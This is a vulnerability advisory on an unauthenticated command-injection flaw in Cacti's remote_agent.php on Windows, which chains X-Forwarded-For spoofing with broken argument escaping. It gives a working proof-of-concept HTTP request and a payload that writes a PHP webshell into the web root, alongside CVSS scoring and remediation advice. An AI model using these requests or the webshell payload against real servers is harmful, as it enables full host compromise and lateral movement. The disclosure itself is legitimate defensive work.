<div align="center">

### `Vulnerability Report:`Unauthenticated RCE on Remote Agent

> **Researcher:** K &nbsp;|&nbsp; **Product:** Cacti `≤ 1.2.30` (Windows) &nbsp;|&nbsp; **Endpoint:** `GET /remote_agent.php?action=graph_json`

</div>

---

## `[01]` Executive Summary

| Field | Value |
|---|---|
| **Product** | Cacti Network Monitoring Application |
| **Affected Versions** | `≤ 1.2.30` (Confirmed on Windows deployment) |
| **Vulnerability Type** | OS Command Injection (CWE-78) |
| **Secondary CWE** | CWE-290: Authentication Bypass by Spoofing |
| **CVSSv3.1 Score** | `10.0 CRITICAL` |
| **Vector** | `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| **Auth Required** | None (Unauthenticated) |
| **Target Platform** | Windows (Primary) — `cmd.exe` specific |
| **Affected Endpoint** | `GET /remote_agent.php?action=graph_json` |
| **Affected Parameter** | `graph_start` |
| **Disclosure Type** | Coordinated Responsible Disclosure (90-day) |

A critical, **unauthenticated Remote Code Execution (RCE)** vulnerability has been identified in Cacti version 1.2.30 and earlier when deployed on Windows operating systems. The vulnerability is the product of two weaknesses that **chain into a complete pre-authentication OS command injection primitive**.

**Chain:**
1. `remote_agent.php` authorises polling clients by IP address using `get_client_addr()`, which blindly trusts attacker-supplied HTTP proxy headers such as `X-Forwarded-For`.
2. The custom `cacti_escapeshellarg()` function on Windows produces output that `cmd.exe` does not interpret as a single quoted argument, allowing an attacker to break out and inject arbitrary shell commands.

The attack is triggered via a **single unauthenticated HTTP GET request** to the `graph_json` action, injecting a payload into the `graph_start` parameter. No credentials, privileges, or user interaction are required. The result is complete compromise of the Windows host.

---

## `[02]` Root Cause Analysis

### 2.A Broken Windows Shell Escaping — `lib/functions.php`

The custom escaping function attempts to make arguments safe for all platforms. On Linux, it correctly delegates to PHP's built-in `escapeshellarg()`. On Windows, however, it uses a hand-rolled implementation that wraps the argument in double quotes and replaces `"` with `\"`.

**Vulnerable Code (`lib/functions.php`):**

```php
function cacti_escapeshellarg($arg) {
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        // ❌ BROKEN: backslash is NOT a quote-escape character in cmd.exe
        return '"' . str_replace('"', '\\"', $arg) . '"';
    } else {
        return escapeshellarg($arg); // Linux: safe
    }
}
```

**Technical Flaw Analysis**

The Windows command processor `cmd.exe` does **not** recognise `\"` as an escaped double quote inside a double-quoted string. Instead, it treats the backslash as a literal character and the following `"` as the closing delimiter of the quoted argument.

**Injection example with payload `a" & whoami & "`:**

```
Input arg:        a" & whoami & "
After function:   "a\" & whoami & \""

cmd.exe parsing:
  Token 1 (quoted):  "a\"    →  rrdtool.exe receives: a\
  Token 2 (bare):    & whoami &  →  cmd.exe executes: whoami
  Token 3 (quoted):  ""      →  ignored
```

---

### 2.B Authentication Bypass via IP Spoofing — `remote_agent.php`

The `remote_client_authorized()` function in `remote_agent.php` restricts access to registered pollers by resolving the client address with `get_client_addr()`. This function iterates through a set of proxy headers **without validating the source**, allowing any remote client to impersonate `127.0.0.1` or any other registered poller.

**Vulnerable Code (`remote_agent.php`):**

```php
function remote_client_authorized() {
    $client_addr = get_client_addr();
    // ↑ reads X-Forwarded-For, HTTP_CLIENT_IP without validation
    foreach ($pollers as $poller) {
        if ($poller['hostname'] == $client_addr) {
            return true; // ← no cryptographic proof required
        }
    }
}
```

---

### 2.C Execution Sink — `graph_json` → `rrdtool`

The `graph_json` action at line 189 of `remote_agent.php` retrieves the `graph_start` parameter raw and passes it through the broken escaping function into `proc_open()` via the rrdtool execution path.

**Vulnerable Execution Flow:**

```php
// Step 1 — remote_agent.php:189
$graph_data_array['graph_start'] = get_request_var('graph_start');
// ↑ No integer validation — raw string accepted

// Step 2 — rrdtool_function_graph()
$cmd .= ' --start=' . cacti_escapeshellarg($graph_data_array['graph_start']);
// ↑ Broken escaping applied

// Step 3 — __rrd_execute()
proc_open($cmd, ...);
// ↑ Final command string passed to cmd.exe — injection executes
```

---

## `[03]` Proof of Concept

### 3.1 Prerequisites

- Target running Cacti `≤ 1.2.30` on a Windows server
- At least one graph and poller configured (default installation state)
- Network access to the Cacti web interface — **no account required**

---

### 3.2 Step-by-Step Exploitation

1. Spoof an authorised poller IP using the `X-Forwarded-For` header set to `127.0.0.1`
2. Inject a command breakout payload into the `graph_start` GET parameter targeting the `graph_json` action
3. The server passes the unsanitised value through `cacti_escapeshellarg()` and into `proc_open()`
4. `cmd.exe` tokenises the broken argument string, executing the injected command

---

### 3.3 PoC HTTP Request

```http
GET /remote_agent.php?action=graph_json&local_graph_id=1&graph_start=a"%20%26%20whoami%20%26%20" HTTP/1.1
Host: TARGET_IP
X-Forwarded-For: 127.0.0.1
Connection: close
```

**Payload breakdown:**

| Part | Role |
|---|---|
| `a"` | Closes the opening double-quote early |
| `&` | `cmd.exe` command separator — starts new command |
| `whoami` | Attacker-controlled command executed |
| `& "` | Opens a third dummy token to clean up the string |

---

### 3.4 Resulting Command on the Server

```
// What Cacti builds:
rrdtool.exe graph - --start="a\" & whoami & \""

// What cmd.exe executes (three tokens):
  [1]  rrdtool.exe ... --start="a\"
  [2]  whoami          ← attacker-controlled command
  [3]  \"\"            ← trailing garbage (ignored)
```

---

### 3.5 Reverse Shell Payload (Full RCE)

```cmd
# Write webshell to disk:
a" & echo ^<?php system($_GET['cmd']); ?^> > C:\inetpub\wwwroot\cacti\shell.php & "
```

---

## `[04]` Impact Analysis

| Dimension | Rating | Description |
|---|---|---|
| 🔴 **Confidentiality** | HIGH | Full read access to database credentials, SNMP strings, API keys, monitored host data, and Windows file system |
| 🔴 **Integrity** | HIGH | Arbitrary file write — enables persistent webshell, modification of Cacti config, poller scripts, and OS files |
| 🔴 **Availability** | HIGH | Service termination, resource exhaustion, ransomware deployment, and complete host takeover |
| ⚠️ **Scope** | CHANGED | Cacti monitors the network infrastructure — compromise enables lateral movement to **all monitored hosts** |

---

## `[05]` CVSS v3.1 Scoring

| Metric | Value | Justification |
|---|---|---|
| **Attack Vector (AV)** | Network (N) | Single HTTP request, no physical access |
| **Attack Complexity (AC)** | Low (L) | No race conditions, no special timing |
| **Privileges Required (PR)** | None (N) | IP spoofing via `X-Forwarded-For` bypasses all auth |
| **User Interaction (UI)** | None (N) | Fully automated, no victim interaction |
| **Scope (S)** | Changed (C) | Compromise of Cacti = compromise of all monitored network hosts |
| **Confidentiality (C)** | High (H) | Full filesystem and DB credential access |
| **Integrity (I)** | High (H) | Arbitrary command execution, persistent webshell |
| **Availability (A)** | High (H) | Full denial of service possible |

> **Base Score: `10.0 — CRITICAL`**  
> **Vector String:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

---

## `[06]` Remediation Recommendations

| Priority | Action |
|---|---|
| 🔴 Immediate | Replace the custom `cacti_escapeshellarg()` for Windows with a robust implementation or use the native `escapeshellarg()` if possible |
| 🔴 Immediate | Validate `graph_start` and `graph_end` parameters using `FILTER_VALIDATE_INT` **before** they reach the shell execution layer |
| 🟠 Short-term | Restrict `X-Forwarded-For` and similar proxy headers — validate poller identity using cryptographic tokens rather than IP address comparison |
| 🟡 Long-term | Replace all `proc_open` string commands with array invocation to eliminate shell parsing entirely. Implement Windows-specific CI/CD adversarial input tests |

---
